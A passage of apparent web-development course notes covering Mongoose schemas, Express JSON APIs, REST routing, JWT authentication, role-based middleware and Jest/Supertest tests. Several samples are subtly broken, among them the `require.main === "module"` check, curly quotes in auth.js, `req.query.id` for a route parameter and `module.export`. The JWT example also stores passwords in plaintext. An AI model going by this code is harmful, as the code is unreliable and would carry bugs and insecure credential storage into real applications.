  // The errors returned after a failed validation
  // contain an `errors` object containing the failed properties
  assert.equal(error.errors.name.message, 'Path `name` is required.');
  assert.equal(error.errors.prepTime.message, 'Some prep time must be considered');
});
```

> `{PATH}` is replaced with the invalid document path

## References  

* [Mongoose - Validation](http://mongoosejs.com/docs/validation.html)

---

[MongoDB with Mongoose](MongoDBMongoose.md)

# Extending Mongoose models  

## Terminology  

* *virtual field*: This appears to be a field and can even be set if configured to, but is not stored in the database, and cannot be used in queries.

* *instance method*: A method available on all individual model instances.

* *static method*: A method available on the model class.

* *query helper method*: A method available when chaining query methods.

## Examples  

### Recipe schema used throughout lesson  

```js
const recipeSchema = new mongoose.Schema({
    name: { type: String, required: true, unique: true },
    prepTime: Number,
    cookTime: Number,
    ingredients: [{
        amount: { type: Number, required: true, default: 1 },
        measure: { type: String, lowercase: true, trim: true },
        ingredient: { type: String, required: true }
    }],
    steps: [String],
    source: {type: String}
})

const Recipe = mongoose.model(recipeSchema);
```

### Virtual fields  

```js
recipeSchema.virtual('totalTime').get(function () {
  return (this.prepTime || 0) + (this.cookTime || 0);
});

// later on, with a recipe called "pancakes"...

pancakes.prepTime = 10;
pancakes.cookTime = 20;
console.log(pancakes.totalTime);
// => 30
```

You can even have a virtual field that you can set:

```js
recipeSchema.virtual('allSteps')
    .get(function () {
        return this.steps.join("\n");
    })
    .set(function (val) {
        this.steps = val.trim().split("\n");
    });

// later...
var recipe = new Recipe();
console.log(recipe.allSteps);
// => ""
var steps = `
Grease a pan.
Place batter on pan.
Cook until golden brown.
`;
recipe.allSteps = steps;
console.log(recipe.allSteps);
// => Grease a pan.
// => Place batter on pan.
// => Cook until golden brown.
console.log(steps[2]);
// => Cook until golden brown.
```

### Instance methods  

```js
recipeSchema.methods.findRecipesFromSameSource = function (callback) {
  return this.model('Recipe').find({
    source: this.source,
    _id: {$ne: this._id}
  }, callback);
}

// later...
grandmasPancakes.findRecipesFromSameSource()
  .then(function (recipes) {
    console.log(recipes)
  })
  .catch(handleError);
```

### Static methods  

```js
recipeSchema.statics.findByMaxIngredients = function (maxIngredients, callback) {
    return this.find({ingredients: {$lte: {$size: maxIngredients}}});
};

// later...

Recipe.findByMaxIngredients(3).then(handleSuccess).catch(handleError);
```

### Query methods  

```js
recipeSchema.query.maxIngredients = function (maxIngredients, callback) {
    return this.where({ingredients: {$lte: {$size: maxIngredients}}});
};

// later...

Recipe.find({cookTime: {$lte: 30}})
  .maxIngredients(3)
  .then(handleSuccess)
  .catch(handleError);
```

## References  

* [Mongoose schema docs](http://mongoosejs.com/docs/guide.html)

---

[Express: JSON APIs](ExpressJSONAPIs.md)

# Use and verify express JSON APIs using postman and curl  

## Terminology  

* **Curl** (`curl`): a command line tool for URL manipulations and transfers, commonly used for making HTTP requests.

* **Postman** ([Postman](https://www.getpostman.com/)): a Graphical user interface for making HTTP requests.

### Postman features  

Request builder

* method

* URL

* headers

* body

* cookies

* URL encoded vs Raw

Response

* body

* headers

* status code

* response time

* response size

* cookies

Other

* Examine History

* Save a request

* Save collections of requests

* Save a response

## Examples  

Show `curl` usage and options

```
$ curl --help
```

Show `curl` manual (verbose)

```
$ curl --manual
# or pipe it to less to page it
$ curl --manual | less
```

GET assets from a URL

```
$ curl https://someserver.com/api
```

POST data to a URL

```
curl --data "price=19%2E99&qty=3"  https://someserver.com/api
```

## References  

[Postman - Docs](https://www.getpostman.com/docs/)

---

[Express: JSON APIs](ExpressJSONAPIs.md)

# Return objects and arrays of data using JSON  

## Terminology  

* **Content type**: 1In responses, a `Content-Type` header tells the client what the content type of the returned content actually is.

When sending a JSON response we have to tell the client that the response we're sending is JSON in order for the client to accurately communicate and interpret the response.

## Examples  

Using the Express `res.json()` method to send an object and an array of objects.

```ja
app.get('/todo', function(req, res) {
  res.json({title: 'Return some JSON data', complete: false});
})

app.get('/todos', function(req, res) {
  const todos = [
    {
      title: 'Return some JSON data',
      complete: false
    },
    {
      title: 'Make it an array',
      complete: false
    },
    {
      title: 'Celebrate with tacos',
      complete: false
    }
  ]
  res.json(todos);
})
```

Using the Express `res.jsonp()` method to send an object and an array of objects with support for JSONP.

```js
app.get('/todo', function(req, res) {
  res.jsonp({title: 'Return some JSONP data', complete: false});
})

app.get('/todos', function(req, res) {
  const todos = [
    {
      title: 'Return some JSONP data',
      complete: false
    },
    {
      title: 'Make it an array',
      complete: false
    },
    {
      title: 'Celebrate with tacos',
      complete: false
    }
  ]
  res.jsonp(todos);
})
```

## References  

* [MDN - Content Type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type)

* [Express - res.json](https://expressjs.com/en/api.html#res.json)

Lesson Footnotes

* 1: [MDN - Content Type](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type)

---

[Express: JSON APIs](ExpressJSONAPIs.md)

# Use routing appropriately for RESTful URL structure and HTTP verbs  

Use appropriate HTTP verb for the action being performed:

* `GET`: Gets data from the server

* `POST`: Sends data to the server

* `PUT`: Update data on a server; overwrites a resource with a complete new body

* `PATCH`: Update data on a server; applies partial modifications to a resource

* `DELETE`: Deletes data from the server

## Terminology  

* **HTTP verbs** also known as HTTP request methods. Verbs used by an application to indicate the desired action to be performed for a given resource.

## Examples  

Use nouns for resources (route names)

* `GET /items` - Retrieves a list of items

* `GET /items/7` - Retrieves a specific item

* `POST /items` - Creates a new item

* `PUT /items/7` - Updates item #7

* `PATCH /items/7` - Partially updates item #7

* `DELETE /items/7` - Deletes item #7

Notice the single endpoint `/items` has multiple functionalities based on the HTTP method. Also, we're using the plural `/items` instead of a potential `/item`, even for requests that only effect one model instance. This is for consistency and makes the API easier to implement and use.

Relations can be defined by extending a resource route in cases where the relation is commonly requested along with the resource.

* `GET /items/7/relations` - Retrieves list of relations for item #7

* `GET /items/7/relations/3` - Retrieves relation #3 for item #7

* `POST /items/7/relations` - Creates a new relation in item #7

* `PUT /items/7/relations/3` - Updates relation #3 for item #7

* `PATCH /items/7/relations/3` - Partially updates relation #3 for item #7

* `DELETE /items/7/relations/3` - Deletes relation #3 for item #7

Furthermore, `if` the id of a relation is unique among other relations it is possible to eliminate the use of `/items` in the routes used to update or delete an existing relation.

* `PUT /relations/3` - Updates relation #3 for item #7

* `PATCH /relations/3` - Partially updates relation #3 for item #7

* `DELETE /relations/3` - Deletes relation #3 for item #7

---

[Express: JSON APIs](ExpressJSONAPIs.md)

# Describe standard REST conventions in NodeJS  

## Terminology  

* **spinal-case**: using a hyphen "-" to separate words

## Examples  

Use best practices when defining resources (URIs)

* Describe resources with nouns, not verbs.

* In NodeJS, spinal-case is most commonly used to describe a resource name.

Use the appropriate HTTP methods for the related CRUD operations.

* `GET`: Gets data from the server

* `POST`: Sends data to the server

* `PUT`: Update data on a server; overwrites a resource with a complete new body

* `PATCH`: Update data on a server; applies partial modifications to a resource

* `DELETE`: Deletes data from the server

Use HTTP headers to provide information about the request or response or about the object sent in the body.

Make proper use of the various types HTTP headers.

* General Header: For general use in both request and response

* Client Request Header: Used only for request headers

* Server Response Header: used only for response headers

* Entity Header: Used to communicate meta information about the body or the resource identified by the request.

Use query parameters to provide further specificity to queried results

* Paging: When limiting the release of data to small increments or page-fulls

* Filtering: Restrict queried results to certain attributes containing specific values

* Sorting: Organize a set of queried results based on attributes' values

* Searching: Like filtering but with approximate matching

Make proper use of status codes in API responses

* `200`: OK

* `201`: New resource created

* `204`: Successful action, no response body

* `304`: Data returned has not been modified

* `400`: Bad request

* `401`: Unauthorized request, requires authentication

* `403`: Valid request but the server refuses access

* `404`: Not Found, no resource at the provided URI

* `500`: Internal server error, these should not be returned to the client. The error should be logged server-side

---

[Express JSON APIs: Advanced](ExpressJSONAPIsAdvanced.md)

# Filter results based on URL parameters in NodeJS  

## Terminology  

**Route Parameters**: 1Route parameters are named URL segments used to capture the values specified at their position in the URL. The named segments are prefixed with a colon and then the name (e.g. `/:your_parameter_name/`. The captured values are stored in the req.params object using the parameter names as keys (e.g. `req.params.your_parameter_name`).

**Query String**: 2a query string is the part of a uniform resource locator (URL) containing data that does not fit conveniently into a hierarchical path structure. The query string commonly includes fields added to a base URL by a Web browser or other client application, for example as part of an HTML form.

## Examples  

Using Express, Sequelize, and Body Parser with a `Todo` model defined, the following routes describe our API endpoints.

A `get()` request to the `/todos` endpoint will respond with all model instances in the `todo` table.

```js
app.get('/todos', function(req, res){
  Todo.findAll().then( function(data) {
    res.send(data);
  });
});
```

A `get()` request to the `/todos/:id` endpoint will respond with the model instance with the provided `:id`.

Ex `/todos/7`

```js
app.get('/todos/:id', function(req, res){
  id = req.query.id

  Todo.findById(id).then( function(todo) {
      res.send(todo);
  });
});
```

A `get()` request to the `/todos/completed` endpoint will respond with the model instances whose `complete` property value equals `true`.

Ex: `/todos/completed`

```js
app.get('/todos/completed', function(req, res){
  Todo.findAll({
    where: {
      complete: true
    }
  }).then(function(data) {
      res.send(data);
  });
});
// SELECT * FROM todo WHERE complete = true;
```

A `get()` request to the `/todos/uncompleted` endpoint will respond with the model instances whose `complete` property value equals `false`.

Ex: `/todos/uncompleted`

```js
app.get('/todos/uncompleted', function(req, res){
  Todo.findAll({
    where: {
      complete: false
    }
  }).then(function(data) {
      res.send(data);
  });
});
// SELECT * FROM todo WHERE complete = false;
```

Using query parameters, a `get()` request to the `/todos?length=:num` endpoint will respond with the model instances whose `description` property value's length equals the `:num` value provided.

Ex: `/todos/length/12`

```js
app.get('/todos', function(req, res){
  let query = {};
  if (parseInt(req.query.length)) {
    let length = parseInt(req.query.length);
    query = {
      where: sequelize.where(
        sequelize.fn('char_length', sequelize.col('description')),
        length
      )
    }
  }

  Todo.findAll(query).then(function(data) {
    res.send(data);
  });
});
// SELECT * FROM todo WHERE char_length(description) = 12;
```

Using query parameters, a `get()` request to the `/todos?range=:min,:max` endpoint will respond with the model instances whose `id` property value is greater than or equal to the `min` value provided and whose `id` property value is less than or equal to the `max` value provided.

Ex: `GET /todos?range=3,6`

```js
app.get('/todos', function(req, res){
  let query = {};
  if (req.query.range) {
    const range = req.query.range.split(',');
    const min = range[0];
    const max = range[1];
    query = {
      where: {
        id: {
          $and: {
            $gte: min,
            $lte: max
          }
        }
      }
    }
  }

  Todo.findAll(query).then(function(data) {
    res.send(data);
  });
});
// SELECT * FROM todo WHERE id >= 3 AND id <= 6
```

## References  

* [Best Practices for Designing a Pragmatic RESTful API](http://www.vinaysahni.com/best-practices-for-a-pragmatic-restful-api)

#### Lesson Footnotes

* 1: [MDN - Express Tutorial Part 4: Routes and controllers](https://developer.mozilla.org/en-US/docs/Learn/Server-side/Express_Nodejs/routes)

* 2: [Wikipedia- Query String](https://en.wikipedia.org/wiki/Query_string)

---

[Express JSON APIs: Advanced](ExpressJSONAPIsAdvanced.md)

# Adding token based user authentication to an Express API  

## Terminology  

* `JSON Web Token`**(JWT)**: a secured base64url encoded JSON object based protocol for transmitting restricted data.

  * JSON object: made up of zero or more `name` and `value` pairs. `names` are strings and `values` are arbitrary JSON values.

## Advantages  

* The JWT contains all the information needed to identify a user.

* It eliminates the need for `session state`.

* Safe against CSRF attacks. Token is signed using secure methods such as HMAC SHA-256 or RSA.

* The same JWT can be used by several servers / domains. Single Sign On.

* The JWT can be sent with the `HTTP` request in the `body` or `header`.

## How It Works  

* Two-way protocol: `request`/`response`.

  * `response` (JWT) generated from the server.

  * The browser makes a `request` for JWT data.

  * The server generates a signed token and returns it to the browser.

* Subsequent requests: JWT can be sent with every `HTTP` request to the server in order to validate it and return secure resources.

## Structure  

* JWT has three parts

  * `Header`.

  * `Payload`.

  * `Signature`.

### Header  

* Includes the token type and hashing algorithm.

```js
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload  

* `Claims`: user statements.

* 3 types of `claims`:

  * `public`: defined at will by the JWT user (developer).

  * `private`: share predefined information between parties.

  * `reversed`: predefined claims: `iss`, issuer; `exp`, expiration time; `sub`, subject; `aud`, audience.

* Base64Url encoded.

#### Example

```js
{
    "iss": "https://www.theironyard.com", // issuer
    "iat": 1497892326, // issued date
    "exp": 1529428326, // expiration
    "aud": "https://www.medium.com", // audience
    "sub": "JWT example", // subject
    "name": "John", // additional public claim
    "admin": "true" // additional public claim
}
```

### Signature  

* Structure: `encoded header`, `encoded payload`, a `secret` and `encryption algorithm`.

#### Example

The above JWT object, along with a key and HS256 encryption would generate:

Key: qwertyuiopasdfghjklzxcvbnm123456

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL3d3dy50aGVpcm9ueWFyZC5jb20iLCJpYXQiOjE0OTc4OTIzMjYsImV4cCI6MTUyOTQyODMyNiwiYXVkIjoiaHR0cHM6Ly93d3cubWVkaXVtLmNvbSIsInN1YiI6ImV4YW1wbGUiLCJuYW1lIjoiSm9obiIsImFkbWluIjoidHJ1ZSJ9.fYSVpviIN3Igi55RtVQaygTm2b7NDlrHXP5oboTiOhI
```

Decode the token [here](https://jwt.io/#debugger)

## Generating And Verifying A JWT  

* For this demonstration we are not using views.

### Prerequisites  

* Install `jsonwebtoken`.

```
npm install jsonwebtoken --save
```

* Install Express.

* Install Body parser.

* Connect to Database (optional)

* Install, configure, and initialize `Sequelize`.

  * Create a user model with `user_name`, `password` and `user_email` `Sequelize` attributes.

  * Run migration.
  
### Structure  

* JWT-auth-example

  * Controllers
  
    * example.js

    * user.js
    
  * Middlewares

    * auth.js
    
  * Models

    * user.js

  * index.js

  * config.js

  * package.json

### config.js  

* Author a configuration file.

* Here we will store the key we use to sign the JWT. For best practices and security reasons it is best **not to commit** into the repository.

```js
module.exports = {
  // You may include other configuration options here.
  secret: 'supersecurepassword'
}
```

### models/user.js  

* Model sample.

```js
var Sequelize = require('sequelize');
// Set database
var sequelize = {}; // Dev. Database
// Or production database below.
var sequelize = new Sequelize('database', 'username', 'password', {
  host: 'localhost',
  dialect: 'postgres'
});

'use strict'
module.export = function(sequelize, DataTypes){
  var User = sequelize.define( 'user', {
    id: {
      type: Sequelize.INTEGER,
      autoIncrement: true,
      primaryKey: true,
    },
    user_name: {
      type: Sequelize.STRING,
      allowNull: false,
    },
    user_email: {
      type: Sequelize.STRING,
      allowNull: false,
    },
    password: {
      type: Sequelize.STRING,
      allowNull: false,
    }

  }, {
    classMethods: {
      associate: function( models ) {
        //Associations can be defined here.
      }
    }
  });
  return User;
};
```

### generating the JWT - controllers/user.js  

* Here a JWT object is created and sent with the request.

* In this example, the app will look for the user. If not found it will use the `sequelize` `create()` method to create one.

```js
var jwt = require('jsonwebtoken');
// Require the config file containing the key to sign the JWT.
var config = require('../config.js');
// Require sequelize
var Sequelize = require('sequelize');
// Set database
var sequelize = {}; // Dev. Database
// Or production database below.
var sequelize = new Sequelize('database', 'username', 'password', {
  host: 'localhost',
  dialect: 'postgres'
});
//Import user model
var User = require('./user');

module.exports = function(router){
  router.post('/login', function(req, res){
    User = function (req, res){
      User.findOne({
        where: { user_name: req.body.user_name }
      })
      .then(function (user) {
        if(!user){
          // If user does not exist, create one!
          User.create({
            user_name: req.body.user_name,
            user_email: req.body.user_email,
            password: req.body.password
          })
          .then(function(user){
            var token = jwt.sign( // Sign JWT token. Pass in claims.
              {
                user: user.id
              },
              config.secret, // Secret key.
              {
                expiresIn: 24 * 60 * 60
              });
              res.send(200, {
                'token': token,
                'userId': user.id,
                'userName': user.user_name
              });
            });
          } else {
            // If user exist, set status and return json message.
            res.status(404).json({
            error: {
              message: 'Username already exist!'
            }
          });
          }
        });
    }
  });
  return router;
}
```

### token verification - middlewares/auth.js  

* Here we verify the JWT.

* We check for a token. If token is available, we verify.

  * If it is invalid, or it has expired, we return a 401 status code with an error message.

  * If token is not found, we redirect back to login.

```js
var jwt = require('jsonwebtoken');
var config = require('../config.js');

var auth = function(req, res, next) {
 var token = req.body.token || req.headers[‘x-access-token’];
  if (token) {
   jwt.verify(token, config.secret, function(err, decoded) {
      if (err) {
         console.error(‘Verification Error’, err);
         return res.status(401).send(err);
      } else {
         req.decoded = decoded;
         return next();
      }
   });
  } else {
    // Redirect back to login if token not found.
   res.redirect(401, '/')
   }
}
```

### controllers/example.js  

* Here we create a route, which we will protect later.

```js
module.exports = function(router){
  router.get('/example', function(req, res){
    res.json({data: 'JWT authentication implementation!'});
  });
  return router;
}
```

### Implementation in index.js  

```js
var express = require('express');
var app = express();
var router = express.Router();
var bodyParser = require('body-parser');

app.use(bodyParser.json());

// Add middleware.
app.use('/api', require('./middlewares/auth.js'));

// Protected route implementation. Available at /api/example
app.use('/api', require('./controllers/example.js')(router));

// Login router handler implementation.
app.use('/', require('./controllers/user.js')(router));

app.listen(3000);
```

### client side  

* Manually set headers so that the middleware knows if the route is authenticated.

```
headers[‘x-access-token’] = [jwt-token]
```

## Changing Default Algorithm And Signing Asynchronously  

```js
// Default algorith (HMAC SHA256)
var jwt = require('jsonwebtoken');
var token = jwt.sign({ foo: 'bar' }, 'secret');
//backdate a jwt 30 seconds
var older_token = jwt.sign({ foo: 'bar', iat: Math.floor(Date.now() / 1000) - 30 }, 'shhhhh');

// Using  SHA256
var cert = fs.readFileSync('private.key');  // get private key
var token = jwt.sign({ foo: 'bar' }, cert, { algorithm: 'RS256'});

// Signing asynchronously
jwt.sign({ foo: 'bar' }, cert, { algorithm: 'RS256' }, function(err, token) {
  console.log(token);
});
```

---

[Express JSON APIs: Advanced](ExpressJSONAPIsAdvanced.md)

# Restricting Access To Information Based On User Role  

## Terminology  

`User authorization`: the process of granting resource access rights to specified entities based on role.

### Workflow  

* Incorporate user *authentication (session or token)*.

* Create user model which includes a role (enum) field, i.e., `admin`, `owner`, `user`.

* Restrict information access:

  * Get user role from request.

  * Restrict resources based on user role.

## Authoring A Simple Middleware  

* For demonstration purposes.

#### Example

```js
// Incorporate session / token authentication

function userRole (role) {
    return function (req, res, next) {
        if (req.session.user && req.session.user.role === role ) {
          // If it checks out, move along.
            next();
        } else {
          // If user does not checkout, set HTTP code and redirect back to home.
            res.redirect(403, '/');
        }
    }
}

app.get("/", function(req, res){
  /*
  Example:
  res.render('index', { title: 'home' });
  */
});

app.get("/post", userRole("admin"), function(req, res){
  /*
  "Create" post logic.
  Example:
  var title = req.body.title;
  Post.create({title: title}).then(function(post){
    //....
  })
  */
});

app.get("/post/:id", userRole("owner"), function(req, res){
  /*
  "View" post logic.
  Retrieve post based on id.
  Example:
  var id = req.query.id;
  var selectedPost = Post.findById(id);
  res.send(selectedSelected);
  */
});
```

## Using An Express Add-on  

* Production setting consideration:

  * Use an add-on such as Connect Roles.
  
### Connect Roles  

  * Installation:

```
npm install connect-roles --save
```

* Usage

```js
var authentication = require('your-authentication-module-here'); // Session or token authentication.
var ConnectRoles = require('connect-roles');
var express = require('express');
var app = express();

// optional function to customize code that runs when user fails authorization.
var user = new ConnectRoles({
  failureHandler: function (req, res, action) {
    var accept = req.headers.accept || '';
    res.status(403);
    if (accept.indexOf('html') >= 0) {
      res.render('access-denied', {action: action});
    } else {
      res.send('Access Denied - You don\'t have permission to: ' + action);
    }
  }
});

app.use(authentication); // Use session or token authentication.
app.use(user.middleware());

//anonymous users can only access the home page
//returning false stops any more rules from being
//considered
user.use(function (req, action) {
  if (!req.isAuthenticated()) return action === 'access home page';
})

//Owner users can access private page, but
//they might not be the only ones so we don't return
//false if the user isn't a moderator
user.use('access private page', function (req) {
  if (req.user.role === 'owner') {
    return true;
  }
})

//admin users can access all pages
user.use(function (req) {
  if (req.user.role === 'admin') {
    return true;
  }
});

app.get('/', user.can('access home page'), function (req, res) {
  /*
  Example:
  res.render('index', { title: 'home' });
  */
});
app.get('/post/:id', user.can('access private page'), function (req, res) {
  /*
  "View" post logic.
  Retrieve post based on id.
  Example:
  var id = req.query.id;
  var selectedPost = Post.findById(id);
  res.send(selectedPost);
  */
});
app.get('/post', user.can('access admin page'), function (req, res) {
  /*
  "Create" post logic.
  Example:
  var title = req.body.title;
  Post.create({title: title}).then(function(post){
    //....
  })
  */
});

app.listen(3000);
```

* See [docs](http://documentup.com/ForbesLindesay/connect-roles#installation) for Connect Roles method details.

---

[Tests and Test Driven Design](TestsandTestDrivenDesign.md)

# Test Driven Development (TDD)  

TDD Process

* Requirements form test cases

* Tests are written to describe functionality

* functionality is written and improved to pass tests

* Repeat the process

A unit usually consists of either a class or a module (group of related functions)

Test Structure

* setup: set the state for the unit or overall environment to run the test

* execution: run the unit and capture output

* validation: ensure the output passes the test

* cleanup: restore the state of the unit or environment

TDD looks like:

* simple design

  * only write tests that match requirements

  * only write code that passes tests

* modular design

  * writing smaller units that perform limited tasks can provide reusable code

  * units are intended to be tested independently and integrated later

* short development cycles

* repetition

* increased productivity

* test suite provides constant feedback

* less running of debuggers

* tests can act as documentation

TDD Limitations and Considerations:

* more time spent in early stages of development

* not reliable for user interfaces

* not reliable for working with databases

* can be difficult or limited when dependent on specific network configurations

* can be difficult to convince stakeholders that time spent on TDD is necessary and profitable

* the same developer writing tests and functionality can still allow for blindspots

* false sense of security can lead to lack of integration testing or compliance testing

* tests require additional maintenance

## Terminology  

* **Test Driven Development (TDD)**: the process of writing tests that gauge functionality against a set of requirements, then writing the software to match the tests. Software that does not meet requirements is not allowed in the code base. The process of writing tests, programming to pass tests, and improving code is repeated indefinitely in a growing application. New features are are added through TDD. Legacy code (including tests) are refactored along the same cycle. TDD can and should be applied to applications from conception through development but it can also be used to refactor legacy applications. TDD inspires confidence in development by ensuring code is functionally sound and meets requirements.

## Examples  

A basic Jest unit test example:

```js
test("multiplier", function () {
  expect(multiplier(3, 5)).toBe(15);
})
```

The corresponding function:

```
function multiplier(x, y) {
  return x * y;
}
```

---

[Tests and Test Driven Design](TestsandTestDrivenDesign.md)

# Author feature tests using Jest for an Express app  

## Terminology  

* *Jest*: [Jest](https://facebook.github.io/jest/) is a testing framework for NodeJS and client side JavaScript applications. Jest provides asynchronous testing with reporting.

* *Supertest*: [Supertest](https://github.com/visionmedia/supertest) is a library that allows to you make and test web requests and responses. Uses [Superagent](https://github.com/visionmedia/superagent) methods as well as its own `.expect` method.

## Examples  

```js
// app.js
const express = require('express');
const app = express();

app.get('/hello', function (req, res) {
  res.json({"hello": "world"})
})

if (require.main === "module") {
  app.listen(3000, function () {
      console.log('Express running on http://localhost:3000/.')
  });
}

module.exports = app;
```

```js
// test/hello_test.js
const request = require("supertest");
const app = require("../app");

describe("GET /hello", function () {
  test("should return successfully", function () {
    return request(app)
      .get("/hello")
      .expect(200)
      .expect("Content-Type", "application/json; charset=utf-8")
      .expect(function (res) {
        expect(res.body['hello']).toBe("world");
      });
  })
})
```

## Jest  

[Jest](https://facebook.github.io/jest/) is a library for writing tests.

By default, Jest runs all files that end in `.test.js`.

Jest uses two functions, `test` and `describe`, to define tests. The important thing to remember about these is that you do not have to require them. They are made available to your tests by Jest.

```js
// test/sample.test.js
describe("A string", function () {
  test("it can be uppercased", function () {
    expect("Hello".toUpperCase()).toBe("HELLO");
  });

  test("it can be lowercased", function () {
    expect("Hello".toLowerCase()).toBe("hello");
  })
});
```

```
$ jest
PASS  test/sample.test.js
 ✓ it can be uppercased (4ms)
 ✓ it can be lowercased

Test Suites: 1 passed, 1 total
Tests:       2 passed, 2 total
Snapshots:   0 total
Time:        1.069s
Ran all test suites matching "sample.test.js".
```

`describe` is used to set a context for tests. It can be nested, with multiple `describe` calls inside a parent. `test` is used to write individual test cases. You can use `test` outside of a describe block with no problem.

You can test simple functions and methods this way.

## Testing controller functions  

In an Express app, you often want to test the functions that handle your routes -- your *controller functions*. To do this, install the library `supertest`. This library lets you make HTTP requests and run tests against the results. In addition, you will need to make your `app` object available. To do that, add `module.exports = app;` to the bottom of your `app.js` file (or whatever you have called the file where your Express app is created.)

You will also want to change your code that calls `app.listen` to look like the following:

```js
if (require.main === "module") {
  app.listen(3000, function () {
      console.log('Express running on http://localhost:3000/.')
  });
}
```

`require` is an object available in your module. When your module is run as a script (`node app.js`), `require.main` will equal "module" and the `app.listen` code will be run. When your module is required from another module -- like we will do with the tests -- the `app.listen` code will not be run.

To test your controller functions, you will need to require `supertest` and learn about how Jest handles asynchronous code. Let's look at an app and a controller test and then see how they work.

```js
// app.js
const express = require('express');
const app = express();

app.get('/hello', function (req, res) {
  res.json({"hello": "world"})
})

if (require.main === "module") {
  app.listen(3000, function () {
      console.log('Express running on http://localhost:3000/.')
  });
}

module.exports = app;
```

```js
// test/hello_test.js
const request = require("supertest");
const app = require("../app");

describe("GET /hello", function () {
  test("should return successfully", function () {
    return request(app)
      .get("/hello")
      .expect(200)
      .expect("Content-Type", "application/json; charset=utf-8")
      .expect(function (res) {
        expect(res.body['hello']).toBe("world");
      });
  })
})
```

Notice that we are returning something from our test. `request(app)` and the methods we call on it return a promise. To wait for a promise to resolve and run all the tests, we must return it. If we do not, Jest will think the test has run successfully before any of our expectations run.

`request(app)` sets up Supertest to make requests against your app. This handles running the app for you, so you don't have to know the address and port of the web application.

`.get("/hello")` makes a `GET` web request to `/hello`, as you might expect. This returns a promise that we can then run tests against.

`.expect` is a Supertest method that is very flexible and allows you to test multiple features of the response from the server. [See the API documentation](https://github.com/visionmedia/supertest#api) to learn all the ways in which `.expect` can be called. We are calling it three ways here:

```js
request(app)
  .get("/hello")
  // Checks to see if the status code is 200.
  .expect(200)
  // Checks to see if the header "Content-Type" is equal to the value here.
  .expect("Content-Type", "application/json; charset=utf-8")
  // Runs the function, passing in the response.
  // Assertions defined in the function.
  .expect(function (res) {
    expect(res.body['hello']).toBe("world");
  })
```

## npm test  

Our `package.json` file has a section we have not explored until now. The `scripts` object can contain terminal commands that we need to run frequently, including a command to test our code. Change your `package.json` to have the following `scripts` object:

```js
{
  "private": true,
  "dependencies": {
    // list of your dependencies
  },
  "scripts": {
    "test": "jest --forceExit"
  }
}
```

Now run `npm test`. Jest should run. This gives us an easy-to-remember standard way to run tests for any Node project we come across, no matter what tools or configuration those tests may need.

Note that we included the argument `--forceExit`. Supertest starts a server for us to run our tests against. Jest does not know how to clean this up, so it will hang after the tests are run. `--forceExit` tells it to shutdown even though there is a server still running.

---

[Tests and Test Driven Design](TestsandTestDrivenDesign.md)

# Author unit tests for Express models  

## Configuration  

To test more complicated applications -- ones with databases, for example -- we will require more set up. This has two steps. First, you will need to configure your application differently depending on how you are running it. A common way to do this is to set the `NODE_ENV` environment variable to a value like `development`, `production`, or `test` and then use that value to look up a configuration object. If you've looked at the models/index.js file that Sequelize creates, then you may have seen this.

To do this yourself, first create a file called `config.json`. Here is one for an app that uses MongoDB.

```js
// config.json
{
  "development": {
    "mongoURL": "mongodb://localhost:27017/coolapp_development"
  },
  "test": {
    "mongoURL": "mongodb://localhost:27017/coolapp_test"
  }
}
```

Then in `app.js`, we would write code like this:

```js
const express = require('express');
const mongoose = require('mongoose');
const app = express();

// Default to the "development" environment.
const nodeEnv = process.env.NODE_ENV || "development";
const config = require("./config.json")[nodeEnv];

mongoose.connect(config.mongoURL);
```

You can set up any configuration variables you need to in this way. Note that to make sure your tests use the test configuration, you will have to run `NODE_ENV=test jest --forceExit`. Change your `test` script in `package.json` to run this:

```js
{
  "scripts": {
    "test": "NODE_ENV=test jest --forceExit"
  }
}
```

There is a `config` [library you can install via NPM](https://www.npmjs.com/package/config) that takes this pattern and extends it. You may want to look at it if you need more support than this provides.

## Test hooks  

Jest provides four *hooks* for us to use in our tests.

```js
describe('hooks', function() {
  beforeAll(function() {
    // runs before all tests in this block
  });

  afterAll(function() {
    // runs after all tests in this block
  });

  beforeEach(function() {
    // runs before each test in this block
  });

  afterEach(function() {
    // runs after each test in this block
  });

  // test cases
});
```

These hooks can be used to set up data we need for our tests, clear out databases, or anything else we might need. They apply both inside the same `describe` function they are in and in any nested `describe` functions. They can even be defined outside of a `describe`. In that case, they will apply to all tests in the module. They also provide a `done` function in the case we have asynchronous actions we want to take. (We can also return promises like we would from a test to wait for asynchronous actions.)

For example, we may want to connect to MongoDB before our tests, and clear out a collection before each test to make sure we have a clean setup. Here is an example:

```js
const mongoose = require('mongoose');
const config = require("../config")[process.env.NODE_ENV || 'test'];
const Recipe = require("../models/recipe");

// connect to Mongo
beforeAll(function (done) {
  mongoose.connect(config.mongoURL).then(done);
});

// drop database
after(function (done) {
  mongoose.connection.dropDatabase(done);
})

describe("Recipe", function () {
    // delete all recipes
    beforeEach(function () {
        return Recipe.deleteMany({});
    });

    it("can be created", function () {
        return Recipe.create({name: "Pancakes"})
          .then(function (recipe) {
            expect(recipe.id).toBeTruthy();
            expect(recipe.name).toBe("Pancakes");
        });
    });
})
```

## Why worry about this?  

You want to make sure your tests are *deterministic* -- that is, that when you run them, you get the same results each time. In the above code, it's assumed that the `name` field on recipes is unique. In this case, the test would fail if we didn't delete all recipes before each test and had multiple tests making a recipe with the name "Pancakes." Having a fresh database for each test is imperative to ensure your tests are deterministic.

---

[Tests and Test Driven Design](TestsandTestDrivenDesign.md)

# Naming Conventions and Class/Function Length Best Practices  

## Terminology  

* **function scope**: Functions create a pocket of scope. Nested functions create internal pockets of scope which can access outer functions' scopes and global scopes. Outer scopes cannot access inner functions' scopes.

* **block scope**: Encapsulating scope in contexts other than functions; if statements and for loops, for example.

* **let**: The `let` keyword includes the variable declaration in the scope of any block it's contained in (usually a `{ .. }` pair). `let` implicitly uses any block's scope for its variable declaration.

* **const**: Like `let`, `const` uses block scope, however, `const` has a value which is fixed. Attempts to change a `const` declared variable will result in an error.

### Variables  

* Variables should be declared with `const` or `let` before they are used.

  * `var` is declared with function scope.

  * `const` and `let` are declared with block scope.

  * Use `let` and `const` in order isolate scope to containing blocks.

  * Use `let` if a variable's value will change.

  * Use `const` to declare variables whose values will not change (preferred method).

* Make variable names descriptive.

* Never use abbreviations in variables.

* Use camel case for two word variables.

* Avoid global variables.

* Avoid changing the type of a variable.

### Functions  

* Functions should be declared before they are used.

